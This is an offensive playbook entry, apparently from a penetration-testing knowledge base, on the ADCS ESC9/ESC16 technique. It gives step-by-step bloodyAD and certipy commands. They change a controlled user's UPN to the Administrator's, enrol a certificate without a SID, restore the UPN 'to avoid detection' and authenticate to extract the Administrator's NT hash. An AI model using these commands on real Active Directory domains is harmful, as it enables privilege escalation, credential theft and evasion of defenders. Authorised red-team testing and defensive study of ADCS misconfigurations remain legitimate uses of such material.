# ADCS ESC9/ESC16 — UPN-Only Auth via No-Security-Extension Flag

## When this applies

- ADCS template has `CT_FLAG_NO_SECURITY_EXTENSION` (removes the SID extension from issued certs).
- You have `GenericWrite`/`GenericAll` on a user who can enroll in the vulnerable template.
- Goal: enrol a cert that authenticates by UPN alone — no SID — and target Administrator.

## Technique

`CT_FLAG_NO_SECURITY_EXTENSION` removes the NTDS CA Security Extension (SID) from the issued cert. The KDC then maps the cert by UPN only. Change the enrolling user's UPN to the target's UPN, request the cert, and authenticate.

## Steps

```bash
# ESC9/ESC16: CT_FLAG_NO_SECURITY_EXTENSION removes SID from cert → UPN-only auth
#   Requires: GenericWrite/GenericAll on a user who can enroll in the vulnerable template
#   Step 1: Change enrolling user's UPN to target (e.g., administrator@domain)
bloodyAD -d domain -u attacker -p pass --host DC_IP set object enrollUser userPrincipalName -v 'administrator@domain'
#   Step 2: Request cert (cert gets UPN=administrator, no SID embedded)
certipy req -u enrollUser@domain -p pass -target DC_IP -ca CA-NAME -template VULN_TEMPLATE
#   Step 3: Restore enrolling user's UPN to avoid detection
bloodyAD -d domain -u attacker -p pass --host DC_IP set object enrollUser userPrincipalName -v 'enrollUser@domain'
#   Step 4: Auth with cert → KDC maps by UPN → get target NT hash
certipy auth -pfx administrator.pfx -dc-ip DC_IP
#   NOTE: Use -target IP if certipy req times out on NETBIOS name resolution
```

## Verifying success

- `certipy auth` returns the target's NT hash.
- The enrolling user's UPN is restored to its original value.

## Common pitfalls

- Skipping step 3 (UPN restore) leaves a noisy artifact and may lock the enrolling user out of their own SSO.
- If `certipy req` hangs on NETBIOS resolution, pass `-target <IP>`.
- Older patched DCs (pre-May 2022) won't enforce SID strong-binding regardless — use this technique opportunistically rather than as a fallback for ESC1 SID-mismatch errors.

## Tools

- certipy
- bloodyAD
